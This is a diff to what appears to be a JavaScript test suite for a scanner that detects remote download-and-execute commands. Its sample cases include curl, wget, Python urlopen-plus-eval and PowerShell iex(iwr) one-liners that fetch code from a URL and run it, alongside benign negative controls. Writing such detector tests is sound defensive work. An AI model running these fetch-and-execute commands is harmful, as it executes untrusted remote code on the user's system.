@@ -22,7 +22,7 @@ const attacks=[
  ['mixed-link-chain','curl -fsSL '+U+' -o payload; ln payload stage.sh; cp -f stage.sh target.sh; bash target.sh','REMOTE_DOWNLOADED_FILE_EXECUTION'],
  ['curl-joined-output-and-hardlink','curl -fsSL '+U+' -opayload; ln -f payload target.sh; bash target.sh','REMOTE_DOWNLOADED_FILE_EXECUTION'],
  ['wget-joined-output-and-symlink','wget -q '+U+' -Opayload; ln -sfn payload target.sh; sh target.sh','REMOTE_DOWNLOADED_FILE_EXECUTION'],
- ['python-multiline-command',\"python -c 'import urllib.request\\ncode=urllib.request.urlopen(\\\"\"+U+\"\\\").read()\\neval(code)'\",'REMOTE_INTERPRETER_FETCH_EXECUTION'],
+ ['python-multiline-command',"python -c 'import urllib.request\ncode=urllib.request.urlopen(\""+U+"\").read()\neval(code)'",'REMOTE_INTERPRETER_FETCH_EXECUTION'],
  ['pwsh-quoted-url','iex (iwr \''+U+'\').Content','REMOTE_POWERSHELL_EXECUTION','pwsh'],
  ['pwsh-double-quoted-url','Invoke-Expression (Invoke-WebRequest \"'+U+'\").Content','REMOTE_POWERSHELL_EXECUTION','pwsh'],
  ['pwsh-variable-url','iex (iwr $endpoint).Content','REMOTE_POWERSHELL_EXECUTION','pwsh'],
@@ -46,7 +46,7 @@ const benign=[
  ['pwsh-quoted-documentation','Write-Host \"iex (iwr '+U+').Content\"','pwsh'],
  ['pwsh-download-only','iwr $endpoint','pwsh'],
  ['pwsh-eval-only','iex \"hello\"','pwsh'],
- ['python-download-only',\"python -c 'import urllib.request; print(urllib.request.urlopen(\\\"\"+U+\"\\\").read())'\"]
+ ['python-download-only',"python -c 'import urllib.request; print(urllib.request.urlopen(\""+U+"\").read())'"]
 ];
 for(const [name,script,shell] of benign){
  test('negative control '+name+' must not falsely flag execution',()=>{
